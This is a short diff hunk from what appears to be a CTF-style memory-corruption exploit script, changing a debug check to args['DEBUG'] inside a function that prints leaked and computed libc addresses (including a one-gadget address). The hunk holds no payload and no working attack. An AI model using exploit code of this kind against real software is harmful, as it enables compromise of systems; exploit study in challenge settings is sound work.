@@ -56,7 +56,7 @@ def exp():
     print "leak_addr = " + hex(leak_addr)
     print "base_addr = " + hex(base_addr)
     print "one_addr = " + hex(one_addr)
-    if DEBUG:
+    if args['DEBUG']:
         pause()
     yes()
     solve3()
